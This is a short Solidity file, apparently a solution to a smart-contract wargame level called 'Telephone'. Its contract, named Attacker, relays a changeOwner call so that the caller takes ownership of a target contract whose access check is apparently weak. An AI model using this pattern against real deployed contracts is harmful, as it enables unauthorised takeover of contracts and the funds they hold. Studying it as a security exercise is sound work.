// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface ITelephone {
    function changeOwner(address owner) external;
}

contract Attacker {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack() external {
        target.changeOwner(msg.sender);
    }
}
